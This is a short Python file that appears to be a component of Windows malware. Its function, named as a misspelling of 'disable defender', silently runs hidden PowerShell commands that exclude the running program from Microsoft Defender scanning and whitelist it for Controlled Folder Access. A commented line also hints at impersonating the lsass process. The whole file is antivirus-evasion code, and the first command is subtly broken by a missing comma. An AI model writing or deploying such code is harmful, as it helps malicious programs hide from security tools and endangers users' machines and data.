import os
import subprocess
import sys



def deseble_defander() -> None:
    path: str = os.path.abspath(sys.argv[0])

    power_shell_commands:list[list[str]] = [  
        
        ["powershell", "-Command Add-MpPreference" "-ExclusionPath", f'{path}'],

        ["powershell", "-Command", f'Add-MpPreference -ControlledFolderAccessAllowedApplications "{path}"']
    ]
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    for command in power_shell_commands:

        try:
            # with self.impersonate_lsass():
            subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=startupinfo)
        except Exception:
            print(f'error in command : {command}')
            continue